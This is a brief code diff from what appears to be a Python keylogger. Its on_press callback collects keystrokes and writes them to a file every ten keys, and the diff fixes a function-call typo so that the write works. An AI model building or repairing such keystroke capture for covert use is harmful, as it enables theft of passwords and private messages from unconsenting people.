@@ -13,7 +13,7 @@ def on_press(key):
 
     if count >= 10:
         count = 0
-        write.file(str(keys))
+        write_file(str(keys))
         keys = []
 
 def write_file(keys):
